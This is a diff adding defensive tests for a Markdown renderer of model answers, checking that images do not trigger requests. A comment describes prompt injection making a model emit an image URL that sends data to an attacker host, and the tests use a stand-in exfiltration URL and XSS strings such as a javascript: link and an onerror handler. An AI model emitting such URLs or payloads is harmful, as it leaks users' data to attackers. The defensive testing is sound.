@@ -79,6 +79,46 @@ describe('AnswerMarkdown', () => {
     expect(a?.getAttribute('rel')).toContain('noopener')
   })
 
+  // A model answer is untrusted output: a prompt can make it emit
+  // `![](https://attacker/?d=<summary of what you can see>)`, and an <img>
+  // would fetch that URL from the reader's browser the moment it renders.
+  // Images therefore render as text (the alt) plus a plain link that only a
+  // deliberate click follows.
+  describe('Markdown images', () => {
+    const EXFIL = 'https://evil.example/a?d=secret'
+
+    it('renders no <img> and makes no request for a Markdown image', () => {
+      const { container } = render(<AnswerMarkdown text={`Summary done. ![x](${EXFIL})`} />)
+      expect(container.querySelector('img')).toBeNull()
+      expect(container.innerHTML).not.toMatch(/<img/i)
+      expect(container.querySelector('[src]')).toBeNull()
+    })
+
+    it('shows the alt text and a plain, nofollow new-tab link to the URL instead', () => {
+      const { container } = render(<AnswerMarkdown text={`![quarterly chart](${EXFIL})`} />)
+      expect(container.textContent).toContain('quarterly chart')
+      const a = container.querySelector('a') as HTMLAnchorElement
+      expect(a).not.toBeNull()
+      expect(a.getAttribute('href')).toBe(EXFIL)
+      expect(a.getAttribute('target')).toBe('_blank')
+      expect(a.getAttribute('rel')?.split(' ').sort()).toEqual(['nofollow', 'noopener', 'noreferrer'])
+    })
+
+    it('renders an image with an unsafe or empty URL as its alt text only', () => {
+      const { container } = render(<AnswerMarkdown text={'![js](javascript:alert(1)) and ![none]()'} />)
+      expect(container.querySelector('img')).toBeNull()
+      expect(container.querySelector('a')).toBeNull()
+      expect(container.textContent).toContain('js')
+      expect(container.textContent).toContain('none')
+    })
+
+    it('does not fetch an image used as a link label either', () => {
+      const { container } = render(<AnswerMarkdown text={`[![badge](${EXFIL})](https://example.com)`} />)
+      expect(container.querySelector('img')).toBeNull()
+      expect(container.textContent).toContain('badge')
+    })
+  })
+
   it('does not render raw HTML from the model', () => {
     const { container } = render(<AnswerMarkdown text={'<img src=x onerror=alert(1)>hi'} />)
     expect(container.querySelector('img')).toBeNull()
